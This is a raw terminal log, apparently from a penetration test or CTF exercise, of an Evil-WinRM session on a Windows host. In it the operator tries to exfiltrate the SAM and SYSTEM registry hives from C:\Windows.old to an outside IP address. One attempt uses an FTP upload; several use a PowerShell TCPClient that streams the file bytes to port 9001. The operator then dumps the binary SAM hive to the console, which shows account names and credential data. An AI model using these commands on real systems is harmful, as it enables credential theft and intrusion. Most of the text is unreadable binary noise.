+At line:16 char:1
++ $Response.Close()
++ ~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
+    + FullyQualifiedErrorId : InvokeMethodOnNull
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/test','
+C:\Windows.old\Windows\System32\SAM')
+Exception calling "UploadFile" with "2" argument(s): "The remote server returned an error: 227 Entering p
+assive mode (127,0,0,1,139,213).
+."
+At line:1 char:1
++ (New-Object Net.WebClient).UploadFile('ftp://10.10.192.141/test','C:\ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> $client = New-Object System.Net.Sockets.TCPClient("10.10.192.141",
+9001);
+$stream = $client.GetStream();
+[byte[]]$bytes = [System.IO.File]::ReadAllBytes("C:\Windows.old\Windows\System32\SAM");
+$stream.Write($bytes,0,$bytes.Length);
+$stream.Close();
+$client.Close();
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> $client = New-Object System.Net.Sockets.TCPClient("10.10.192.141",
+9001);
+$stream = $client.GetStream();
+[byte[]]$bytes = [System.IO.File]::ReadAllBytes("C:\Windows.old\Windows\System32\SAM");
+$stream.Write($bytes,0,$bytes.Length);
+$stream.Close();
+$client.Close();
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> $client = New-Object System.Net.Sockets.TCPClient("10.10.192.141",
+9001);
+$stream = $client.GetStream();
+[byte[]]$bytes = [System.IO.File]::ReadAllBytes("C:\Windows.old\Windows\System32\SYSTEM");
+$stream.Write($bytes,0,$bytes.Length);
+$stream.Close();
+$client.Close();
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> $client = New-Object System.Net.Sockets.TCPClient("10.10.192.141",
+9001);
+$stream = $client.GetStream();
+[byte[]]$bytes = [System.IO.File]::ReadAllBytes("C:\Windows.old\Windows\System32\SAM");
+$stream.Write($bytes,0,$bytes.Length);
+$stream.Close();
+$client.Close();
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> whomai /priv
+The term 'whomai' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ whomai /priv
++ ~~~~~~
+    + CategoryInfo          : ObjectNotFound: (whomai:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> dir C:\windows.old\WINDOWS\system32
+    Directory: C:\windows.old\WINDOWS\system32
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/7/2019   1:14 AM                AppLocker
+d-----          4/4/2022   6:03 AM                Boot
+d---s-          4/4/2022   6:03 AM                Configuration
+d-----          4/4/2022   6:03 AM                DriverState
+d-----          4/4/2022   6:03 AM                DriverStore
+d-----          4/4/2022   6:04 AM                en-US
+d---s-          4/4/2022   6:06 AM                Microsoft
+-a----         12/7/2019   1:09 AM         113256 compmgmt.msc
+-a----         12/7/2019   1:09 AM           9571 ResPriHMImageList
+-a----         12/7/2019   1:09 AM           9196 ResPriHMImageListLowCost
+-a----         12/7/2019   1:09 AM           8977 ResPriImageList
+-a----         12/7/2019   1:09 AM           8690 ResPriImageListLowCost
+-a----          4/4/2022   6:00 AM          57344 SAM
+-a----          4/4/2022   6:00 AM       11636736 SYSTEM
+-a----         3/25/2022   1:34 PM         230400 WorkFoldersShell.dll
+-a----         3/25/2022   1:34 PM        2229576 workfolderssvc.dll
+-a----         3/25/2022   1:31 PM         283648 wosc.dll
+-a----         3/25/2022   1:32 PM         352816 wow64.dll
+-a----         3/25/2022   1:32 PM          21288 wow64cpu.dll
+-a----         3/25/2022   1:32 PM         531984 wow64win.dll
+-a----         3/25/2022   1:33 PM          17920 wowreg32.exe
+-a----         3/25/2022   1:31 PM         452608 WpAXHolder.dll
+-a----         12/7/2019   1:08 AM         103424 wpbcreds.dll
+-a----         3/25/2022   1:31 PM        1643008 Wpc.dll
+-a----         3/25/2022   1:31 PM         336896 WpcApi.dll
+-a----         12/7/2019   1:08 AM          10143 wpcatltoast.png
+-a----         3/25/2022   1:31 PM        1867264 WpcDesktopMonSvc.dll
+-a----         3/25/2022   1:31 PM        1173472 WpcMon.exe
+-a----         12/7/2019   1:08 AM           4687 wpcmon.png
+-a----        11/18/2020   6:48 PM          40448 WpcProxyStubs.dll
+-a----         3/25/2022   1:34 PM          91648 WwanRadioManager.dll
+-a----         3/25/2022   1:31 PM        1518080 wwansvc.dll
+-a----        11/18/2020   6:48 PM          97600 wwapi.dll
+-a----         3/25/2022   1:31 PM         233984 XamlTileRender.dll
+-a----         12/7/2019   1:08 AM           3584 XAudio2_8.dll
+-a----         3/25/2022   1:31 PM         623616 XAudio2_9.dll
+-a----         3/25/2022   1:31 PM        1049088 XblAuthManager.dll
+-a----         3/25/2022   1:31 PM          93696 XblAuthManagerProxy.dll
+-a----         3/25/2022   1:31 PM         114688 XblAuthTokenBrokerExt.dll
+-a----         3/25/2022   1:31 PM        1270272 XblGameSave.dll
+-a----         12/7/2019   1:08 AM         159744 XblGameSaveExt.dll
+-a----         12/7/2019   1:08 AM          39936 XblGameSaveProxy.dll
+-a----        11/18/2020   6:48 PM          33792 XblGameSaveTask.exe
+-a----         12/7/2019   1:08 AM            627 X_80.contrast-black.png
+-a----         12/7/2019   1:08 AM            579 X_80.contrast-white.png
+-a----         12/7/2019   1:08 AM            627 X_80.png
+[31m*Evil-WinRM*[1m[33m PS [0mC:\Users\celia.almeda> type C:\windows.old\WINDOWS\system32\SAM
+regf Ð\SystemRoot\System32\Config\SAMVž³SÄê¨
+:¤i+Vž³SÄê¨
+:¤i+Wž³SÄê¨
+:¤i+rmtm6`3åHØOfRg<¥µìhbin¨ÿÿÿnk,'GÈfHØ˜PÿÿÿÿÿÿÿÿpÿÿÿÿROOT¨ÿÿÿnk AègHØ øIÿÿÿÿàQÐÿÿÿÿ&àSAM€ÿÿÿskppXdˆHX4?
+   úæ—ñðÿÿÿlhxÅøÿÿÿpøÿÿÿÿÿskÐÐàœÄÔ° !?  ??8
+°1€?l¼cL<àPÑ—
+             ¡bË~z¦Àúæ—ñ£
+                         Î  ¨ÿÿÿnk 'GÈfHØxÿÿÿÿÿÿÿÿèÐÿÿÿÿ
+                                                        RXACTèÿÿÿvk
+                                                                   Øðÿÿÿ”å)åøÿÿÿÀàÿÿÿvkàCÿÿÿ	Ð€°ÀD0
+ÀÀÿÿl1?  81
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    øÿÿÿp¨ÿÿÿnk 'GÈfHØx`&ÿÿÿÿ`ÐÿÿÿÿDomainsèÿÿÿvk€0n	èÿÿÿvk€¨ÿÿÿnk Á|öw HØ0
+ÿÿÿÿ¸ÐÿÿÿÿTpBuiltinøÿÿ+øÿÿÿˆ+àÿÿÿvkpFˆþÿÿ'GÈfHØI@Þÿÿ€ÌÏûÿÿÿÌÏûÿÿÿèàÿÿÿvk
+                                                                        ¨VðþÿÿÐÐ
+                                                                                ÜÜ€°ÀD0ÀzÀÿÿl…Å  8…
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø     ðÿÿÿðˆ`>¨ÿÿÿnk 'GÈfHØˆÿÿÿÿhÐÿÿÿÿ
+Usersøÿÿÿ@	øÿÿÿÀ	èÿÿÿvk€¨ÿÿÿnk 'GÈfHØÈÿÿÿÿÿÿÿÿÐÿÿÿÿNamesðÿÿÿlhœ|èÿÿÿvk€øÿÿÿ¨ÿÿÿnk 'GÈfHØˆ°
+	ÿÿÿÿÐÿÿÿÿ
+Groupsèÿÿÿvk€À	èÿÿÿvk€¨ÿÿÿnk 'GÈfHØÿÿÿÿÿÿÿÿÐÿÿÿÿNamesðÿÿÿlhX	œ|èÿÿÿvk€¨ÿÿÿnk C‹IÈfHØˆÈRÿÿÿÿX
+ÐÿÿÿÿAliasesØÿÿÿlhØ	BªáèOÝ.ÈÖkÀ	øÿÿÿ(	¨ÿÿÿnk a†
+                                                         gHØØ	¸[ÿÿÿÿà
+ÐÿÿÿÿFNamesøÿÿÿX
+                øÿÿÿh
+                     èÿÿÿvk€øÿÿÿÈ
+¨ÿÿÿnk 'GÈfHØØ	¨Nÿÿÿÿ¸
+ÐÿÿÿÿRMembersøÿÿÿ°
+øÿÿÿ8øÿÿÿ¨èÿÿÿvk€€ÿÿÿnk Á|öw HØè
+x¤ÿÿÿÿÀ
+Ðÿÿÿÿ)S-1-5-21-1613424066-3239774370-1740908391øÿÿÿÀNøÿÿÿ˜Q¨ÿÿÿnk 'GÈfHØp
+                                                                         ÿÿÿÿÿÿÿÿ˜
+                                                                                  Ðÿÿÿ000001F4øÿÿÿXøÿÿÿ è
+ÿÿÿvk€èÿÿÿvk€ øÿÿÿ€
+                    ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿ(
+ÐÿÿÿÿAdministratorsøÿÿÿˆ
+øÿÿÿ@èÿÿÿvk€ øÿÿÿ
+¨ÿÿÿnk òQ
+         #HØØ	ÿÿÿÿÿÿÿÿ@
+                         Ðÿÿÿÿ
+                             00000220àÿÿÿvkXˆÉjC
+XŒ%øÿÿÿ àÿÿÿvkðÐ
+Cðýÿÿ ÐÐì–„8€°ÀD0ÀÀÿÿl
+                        8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    AdministratorsAdministrators have complete and unrestricted access to the
+ computer/domainÂå*`'ÄgôÂå*`'ÄgéÂå*`'Ägéèÿÿÿ~€`€7øÿÿÿèšhbinèÿÿÿvk€"À	èÿÿÿvk€!¨ÿÿÿnk Á|öw HØØ	ÿÿÿÿÿÿÿÿ
+P
+                                                                                                        Ð
+ÿÿÿÿ00000221àÿÿÿvk„(¬C¨ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿ`
+         ÐÿÿÿÿGuests ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿ`4ÐÿÿÿÿBackup Operatorsèÿÿÿvk€' ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿh4Ðÿÿÿÿ
+Replicatorèÿÿÿvk€(s˜ÿÿÿnk Eô
+gHØ`
+ÿÿÿÿÿÿÿÿ€2ÐÿÿÿÿRemote Desktop Usersioèÿÿÿvk€+wèÿÿÿvk€, èÿÿÿvk€# èÿÿÿvk€2aøÿÿÿpøÿÿÿ¨¨ÿÿÿnk 'GÈfHØp
+                                                                                                 ÿÿÿÿÿÿÿÿ
+X
+ Ðÿÿÿ000001F5èÿÿÿvk€EÉjèÿÿÿvk€"èÿÿÿvk€=èÿÿÿvk€Dèÿÿÿvk€Eèÿÿÿvk€Gèÿÿÿvk€øøÿÿÿ@k 'GÈfHØØ	ÿÿÿÿÿÿÿÿ
+Ðÿÿÿÿ00000222àÿÿÿvkø  ÉjC~yÉjøÿÿÿHèÿÿÿvk€ ýÿÿ"
+                                              €àðD0ÀÀÿÿœ
+                                                           $ #8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    GuestsGuests have the same access as members of the Users group by defaul
+t, except for the Guest account which is further restrictedÂå*`'Ägõ¨ÿÿÿnk 'GÈfHØp
+                                                                                 ÿÿÿÿÿÿÿÿ
+Ðÿÿÿ000001F7èÿÿÿvk€êÉjøÿÿÿøÿÿÿ€~ ÿÿÿnk a†
+                                         gHØ`
+ÿÿÿÿÿÿÿÿ87Ðÿÿÿÿ
+Device Ownersd Aèÿÿÿvk€éøÿÿÿ@€`¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ@Ðÿÿÿÿ00000245àÿÿÿvkÔhC(þÿÿEèè:$`„€ÈØD0ÀÀÿÿ„
+                                                                                                       $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    System Managed Accounts GroupMembers of this group are managed by the sys
+tem.Âå*`'Äg÷øÿÿÿH ÿÿÿnk a†
+                          gHØ*ÿÿÿÿÿÿÿÿp*ÐÿÿÿÿDefaultAccountèÿÿÿvk€!ß¨àÿÿÿvø#mÌCÖkÀ	¨ÿÿÿnk 'GÈfHØØ
+	ÿÿÿÿÿÿÿÿèÐÿÿÿÿ00000247àÿÿÿvk¤`XþÿÿGèèlp€ÈØD0ÀÀÿÿ„
+                                               $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Device OwnersMembers of this group can change system-wide settings. ÿÿÿnk
+ Eô
+gHØ`
+ÿÿÿÿÿÿÿÿ3Ðÿÿÿÿ
+              Power UsersatorsèÿÿÿØyPzH.pzØh¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿhÐÿÿÿÿ00000227àÿÿÿvk4pEÉjC~y
+Éjèÿÿÿvk€ëÉjàÿÿÿvk˜èJÉjC
+XŒ%øÿÿÿ˜ÿÿÿnk a†
+                gHØ`
+ÿÿÿÿÿÿÿÿøÐÿÿÿÿEvent Log Readersp¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ Ðÿÿÿÿ00000228àÿÿÿvk| "Cøÿÿÿ¨ÿÿÿnk a†
+                                                                                             gHØ +ÿÿÿÿÿÿÿ
+ÿØÐÿÿÿÿNoner U¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ8Ðÿÿÿÿ0000022FøÿÿÿXøÿÿÿÈðÿÿÿx&(hbin  þÿÿ'ÐÐ ðÒÄ€°ÀD0ÀÀÿÿl
+                                                                                                  8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Backup OperatorsBackup Operators can override security restrictions for t
+he sole purpose of backing up or restoring files€þÿÿ(èèüJH€ÈØD0ÀÀÿÿ„
+                                                                       $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    ReplicatorSupports file replication in a domains¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ
+èÐÿÿ00000223ðýÿÿ#¼Ô€àðD0ÀÀÿÿœ
+                               $ #8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Power Users Power Users are included for backwards compatibility and poss
+ess limited administrative powers¨ÿÿÿnk Á|öw HØø+ÿÿÿÿðÐÿÿÿÿ¨Accountèÿÿÿl&5ñˆï
+                                                                             Õàÿÿÿvkp˜&Fˆþÿÿ'GÈfHØ€¦
+ÿÞÿÿ€ÌÏûÿÿÿÌÏûÿÿÿíp0 k]MÌI~;ÐtNÖâ˜
+u”‹ÝRqõ´â­FÄ?ö"·Y±´ß½.˜Í¬ÿÙ‹ÄÖa`òîÓŠë½
+                                      ø*ˆèÕò))ëm ¯?
+Ø*™ÿ.xa6'Kùp0 Ô»¶
+œ—ñ”™uÑD1OÔ
+¦Ñ¹_E7
+ÃÓ€å¶þ‰1g9§ª«cGYïæ%Á>¨Ó
+¹lä`#X«
+DÆuõ8U½œ€Zr¾»ŽT2“Ñ­Ü?¬&¤:bŒÙàÿÿÿvk¨àiV˜ÿÿÿnk a†
+                                               gHØ`
+ÿÿÿÿÿÿÿÿ¨MÐÿÿÿÿHyper-V Administratorsèÿÿÿvk€B¨ÿÿÿnk C‹IÈfHØØ	ÿÿÿÿÿÿÿÿ¨SÐÿÿÿÿ00000242àÿÿÿvk]C8èÿÿÿvk
+€C(g¨ÿÿÿnk C‹IÈfHØØ	ÿÿÿÿÿÿÿÿ0TÐÿÿÿÿ00000243¨ÿÿÿnk Á|öw H&	Ènÿÿÿ*ÐÿÿÿÿUsersèÿÿÿvk€øÿÿÿð)¨ÿ
+ÿÿnk Á|öw HØ˜Ø|ÿÿÿÿ*Ðÿÿÿÿ$NamesøÿÿÿØ3øÿÿÿP0èÿÿÿvk€øÿÿÿx*¨ÿÿÿnk 'GÈfH&.ÿÿÿÿàÐÿÿÿÿGroupsèÿÿÿvk€À	
+èÿÿÿvk€¨ÿÿÿnk a†
+                                                                                                        g
+HØ˜*8-ÿÿÿÿèÐÿÿÿNamesøÿÿÿ(.øÿÿÿà/èÿÿÿvk€¨ÿÿÿnk 'GÈfH-ÿÿÿÿ ,ÐÿÿÿÿAliasesØÿÿÿlh +Bªá˜*èOÝ.˜)ÖkÀ	øÿÿÿð*¨ÿ
+ÿÿnk 'GÈfHØ +ÿÿÿÿÿÿÿÿ¨,ÐÿÿÿÿNamesøÿÿÿ  -èÿÿÿvk€øÿÿÿ,¨ÿÿÿnk 'GÈfHØ +ÿÿÿÿÿÿÿÿ€,ÐÿÿÿÿMembersèÿÿÿlh°,XŒ%(,œ|è
+ÿÿÿvk€ðÿÿÿlh(Xû=¨ÿÿÿnk ¢þ\HØp
+                        ÿÿÿÿÿÿÿÿ TÐÿÿ000003E9èÿÿÿvk€ ¨ÿÿÿnk Á|öw HØ˜*ÿÿÿÿÿÿÿÿx+Ðÿÿÿÿ00000201èÿÿÿlh¸-3yÉj
++œ|àÿÿÿvk|ÈfCÐÿÿÿvk€ÉjForcePasswordResetœÉj› ¡À¡àÿÿÿvkP¨.F0¨ÿÿÿ
+°PÈfHØÿÿÿÿÿÿÿøàÿÿÿvkD¸tV$øÿÿÿ¨>øÿÿÿ˜6Ðÿÿÿvk peSupplementalCredentials! øh ÿÿÿnk a†
+                                                                                  gHØ*ÿÿÿÿÿÿÿÿ€+Ðÿÿÿÿ
+Administratorðÿÿÿp4è2èÿÿÿvk€ô¨ÿÿÿnk .VófHØ˜)ÿÿÿÿÿÿÿÿX3Ðÿÿÿÿ.000001F4èÿÿÿvk€÷àÿÿÿvkPˆ0F¨ÿÿÿÿÿÿÿÿÿÿô*åo
+                                                                                                     àÿÿÿ
+vk°@;VÐÿÿÿvk@01SupplementalCredentials¸ÿÿÿD6hÌ½å7¯¯w'³)¹ÓÕ
+ÏY;+!cÅŠÅï'}ñ…¥ÿ¥;g•pySvŸ…:Ðÿÿÿvk@¨1SupplementalCredentials¸ÿÿÿˆ¸vGµ^¦íÐ{É«ºjm®ZvSÁ:k¸6°µ¿š*«ÔI¬þš#,ù5¶®À
+èÿÿÿ(8 8;x1ÿÿÐÿÿÿvk@82SupplementalCredentials¸ÿÿÿ"^*6—§é7ÐÿÿÿÿPerformance Log UsersoniøÿÿÿÀ3øÿÿÿÀøÿÿÿ Jøÿ
+ÿÿà:øÿÿÿ¸èÿÿÿvk€!Éjèÿÿÿ› ¡À¡ð¡ ¢¥Éj(~¦ÉjØÿÿÿvk	Ð°˜ResetDatacount(vk€è5#ˆ_œ ‡¬¨ÿÿÿnk .VófHØ˜)ÿÿÿÿÿ
+ÿÿÿð1Ðÿÿÿÿ.000001F7àÿÿÿvkPH8F¨ÿÿÿÿÿÿÿÿÿÿ÷àÿÿÿvk¨ @V8þÿÿ+èè(zŒ€ÈØD0ÀÀÿÿ„
+                                                                   $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Remote Desktop UsersMembers in this group are granted the right to logon
+remotely ¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ07Ðÿÿÿÿ0000022Eàÿÿÿvkì¨GyCtemøÿÿÿ ÀJÐÿÿÿvk€UserDontShowInLo
+gonUIHýÿÿôôl||||||||„œ´Ì€ÔäD0ÀDÀÿÿ[ÿ  8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägô    AdministratordBuilt-in account for administering the computer/domai
+n>±%œA9%yAªs"åÄå–Ø,ŠŠ\KÌ¹
+                         ªv²žºõ“—8ñÒÔ–ØŽWú•kR¥Âw±êqêÖóãl«ê¬˜ÿÿÿnk ä2
+                                                                    gHØ`
+ÿÿÿÿÿÿÿÿ 7ÐÿÿÿÿDistributed COM Users¸ÿÿÿvk*€BßVPerComponentWellKnownAccountAppliedUpdatesC Ièÿÿÿvk€!ÅØÿÿÿ
+lh8Z„nÉjZ’nÉj0Q¦nÉjh?“mÖkÀ	¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ;Ðÿÿÿÿ00000232 ÿÿÿnk a†
+                                                                              gHØ`
+ÿÿÿÿÿÿÿÿ(7Ðÿÿÿÿ	IIS_IUSRS¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿØJÐÿÿÿÿ00000238hbin@ Pýÿÿ
+                                                                         ((Jtttttttt|”¬Ä€ìüD0ÀDÀÿÿ¨[ÿ  ÿ
+$8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Äg÷    DefaultAccountA user account managed by the system.oürfÁ;#uaµímô¥jb
+«@17m1Åø+6z©€nÃ
+O
+v›UÇ!gœJŽ}§¡Zoy%òZ|„JüM`ýÿÿèè
+ôôpddddddddl„œ´€ÈØD0ÀDÀÿÿ„ÿ  ÿ $8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    GuestBuilt-in account for guest access to the computer/domain3öLlaß){}é¨„
+                                                                                                        $
+8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Network Configuration OperatorsMembers in this group can have some admini
+strative privileges to manage configuration of networking featuresþÿÿ.èè2œ¸€ÈØD0ÀÀÿÿ„
+                                                                                        $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Performance Monitor UsersMembers of this group can access performance cou
+nter data locally and remotely ÿÿÿnk AègHØxÿÿÿÿÿÿÿÿàÐÿÿÿÿLastSkuUpgradeØÿÿÿlh³Ìƒî˜IC@§hÆfn	èÿÿÿvk
+€8˜ÿÿÿnk a†
+    gHØ`
+ÿÿÿÿÿÿÿÿàJÐÿÿÿÿCryptographic OperatorsàÿÿÿvkøØNCerfèÿÿÿvk€9 øÿÿÿˆMøÿÿÿÀJ`ýÿÿ/èè*Pd€ÈØD0ÀÀÿÿ„
+                                                                                               $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Performance Log UsersMembers of this group may schedule logging of perfor
+mance counters, enable trace providers, and collect event traces both locally and via remote access to th
+is computeràÿÿÿvk¨ÈVCøÿÿÿ˜(ˆÿÿÿnk a†
+                                 gHØ`
+ÿÿÿÿÿÿÿÿðQÐÿÿÿÿ#Access Control Assistance Operators¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿ NÐÿÿÿÿ00000239àÿÿÿ
+vkÄUCøÿÿÿ€NèÿÿÿlhØP»ji	p
+                        æ;ìèÿÿÿvk€þÿÿ2èè*°Ä€ÈØD0ÀÀÿÿ„
+                                                        $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Distributed COM UsersMembers are allowed to launch, activate and use Dist
+ributed COM objects on this machine.¨ÿÿÿnk Ë€ŸÌfHØè
+À>ÿÿÿÿð
+       ÐÿÿÿÿS-1-5À¨ÿÿÿnk 'GÈfHØØPÿÿÿÿÿÿÿÿø
+                                          Ðÿÿÿ00000011¨Xaèÿÿÿvk€8Ðÿÿÿvk€þÿ)ServerDomainUpdatesðÿÿÿð°Qøÿÿÿ
+()˜ÿÿÿnk a†
+           gHØ`
+ÿÿÿÿÿÿÿÿ`RÐÿÿÿÿRemote Management UsersøÿÿÿˆøÿÿÿÐ¨ÿÿÿnk 'GÈfHØØ	ÿÿÿÿÿÿÿÿèTÐÿÿÿÿ0000023D(ÿÿÿlh0
+|yÉjP}yÉjð~yÉj #yÉjˆƒyÉj¨„yÉ5ŽyÉjÐ5yÉjˆ:‘yÉjˆ’yÉjð>£yÉj¨?©yÉj(NªyÉjpRµyÉj°(ÈyÉj@)ÉyÉj\ÊyÉjðËyÉjèÍyÉjè
+XŒ%`
+œ|ernet Information SeøÿÿÿÈøÿÿ)ÿÿÿnk a†
+                                       gHØ`
+ÿÿÿÿÿÿÿÿ¨
+ÐÿÿÿÿSystem Managed Accounts Groupratøÿÿÿ -øÿÿÿ@øÿÿÿH6˜ÿÿÿnk a†
+                                                               gHØ*ÿÿÿÿÿÿÿÿhRÐÿÿÿÿWDAGUtilityAccountUsers
+àÿÿÿvk_F TàÿÿÿvkèØceCderøÿÿÿÀTøÿÿÿ(6ØXi8þÿÿ9èè.v€ÈØD0ÀÀÿÿ„
+                                                             $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Cryptographic OperatorsMembers are authorized to perform cryptographic op
+erations.Pþÿÿ8èèüjh
+                   €ÈØD0ÀÀÿÿ„
+                                $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    IIS_IUSRSBuilt-in group used by Internet Information Services.@þÿÿ=èè"
+                                                                                                      x„€
+ÈØD0ÀÀÿÿ„
+            $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Event Log ReadersMembers of this group can read event logs from local mac
+hine¨ÿÿÿnk Ë€ŸÌfHØØPÿÿÿÿÿÿÿÿ /Ðÿÿÿ00000004¨ÿÿÿnk Ë€ŸÌfHØØPÿÿÿÿÿÿÿÿ(/Ðÿÿÿ0000000B ÿÿÿnk uSHØ*ÿÿÿÿÿÿÿÿ SÐÿÿ
+ÿÿtom_adminÞ¢(g¨ÿÿÿnk 6ZØ#HØ˜)ÿÿÿÿÿÿÿÿ [Ðÿÿÿÿ000003E9èÿÿÿ Tè\Xiˆi¸i(ÿÿÿlh°M\
+	Ù 
+          Õ_
+ªßV8JîQ'h®È(8ø=´K¹t@bBÖ;ÈûU+/0(C IH?6ø“ˆ2Kü#°6ª>Å`5ðÚ«åìÔƒøQÿ£™x˜Ù\-"°S?“mÌøyÖkÀ	   $8
+¨ÿÿÿnk C‹IÈfHØØ	ÿÿÿÿÿÿÿÿàTÐÿÿÿÿ00000244àÿÿÿvk\°‡oVþÿÿBèè,®Ä€ÈØD0ÀÀÿÿ„
+                                                                        $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Hyper-V AdministratorsMembers of this group have complete and unrestricte
+d access to all features of Hyper-V.¨ÿÿÿ6ZØ#HØ¢þ\HØÿÿÿÿÿÿÿéUtilØyPzH.¨ÿÿÿnk .VófHØ˜)ÿÿÿÿÿÿÿÿH4Ðÿÿÿÿ000001
+F8Ðÿÿÿvk€ForcePasswordResehbin``nk sO
+gHØ*ÿÿÿÿÿÿÿÿˆQÿÿÿÿÿÿÿÿ
+                      defaultuser0Ðÿÿÿvk€ÖForcePasswordResetˆšØÜdUû8Tœ ‡¬Ènk òQ
+                                                                               #HØ˜)ÿÿÿÿÿÿÿÿpaÿÿÿÿÿÿÿÿ000
+003E8pvkPHhF8vkxkMVnagvk€!a8aøh(is°ýÿÿCèèF0â€ÈØD0ÀÀÿÿ„
+                                                         $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Access Control Assistance OperatorsMembers of this group can remotely que
+ry authorization attributes and permissions for resources on this computer.ýÿÿDèè.œ´€ÈØD0ÀÀÿÿ„
+                                                                                                 $8
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø    Remote Management UsersMembers of this group can access WMI resources ove
+r management protocols (such as WS-Management via the Windows Remote Management service). This applies on
+ly to WMI namespaces that grant access to the user.€þÿÿo°¸Ô€ D0ÀÀÿÿL   $    NoneOrdinary usersôõ÷øìéêëÝ•+
+çHØ'
+gHØÿÿÿÿÿÿÿèzXnk òQ
+                  #HØp
+                      ÿÿÿÿÿÿÿÿQÿÿÿÿÿÿ000003E80vk€ForcePasswordReset0vk˜8SupplementalCredentialsgÐÿÿÿvk€hú
+ForcePasswordReset Ðÿÿÿvk SupplementalCredentialsØÿÿÿvk	ÐxResetData'Ägß*øPþÿÿ``xx€@PD0ÀzÀÿü
+	…… !ß  … #Õ $8…
+Þ¢(g!>Ò¯­]y°Á)'Vü Ø­föòhúß*øP #P #P #    Âå*`'Ägio€
+                                                   $$$$$$$$$$,D8|”€ìüD0ÀDÀÿ¨[ÿ  8
+!>Ò¯­]y°Á)'Vü Ø­föòhúß*ø$DÂå*`'Ägèÿ $    defaultuser01Ó;Ýšÿ
+š›èô·û¾m Ð9oF®áYV½úU@ô0£ß‡–y–³3‰þ–‹3¯þø{ÖÓ„­mÌ\y„ŒXÝ=dÂT,u¡…ãaá1ÆNqIp:;pp ÿÿÿnk *ªHØ*ÿÿÿÿÿÿÿÿ(TÐÿÿÿÿCheya
+nne.Adams¨ÿÿÿnk °L
+                  ªHØ˜)ÿÿÿÿÿÿÿÿhÐÿÿÿÿ.000003EA ÿÿÿlh	ø/
+                                                         wÉjð3
+                                                              wÉjÐ7wÉjp_wÉjH[Éjpn¥Éj8}¦Éj@§Éj*œ|*œ|¨ÿÿÿ°L
+ªHØÿÿÿÿÿÿÿê¨ÿÿÿnk *ªHØp
+                    ÿÿÿÿÿÿÿÿàÐÿÿÿ000003EAØÿÿÿvk	Ð zResetDatahbinp hûÿÿ\`Kwp–?iØT–m¶æ|E´Ýe^i\ê_sbd<è9ýï>eü
+Ê
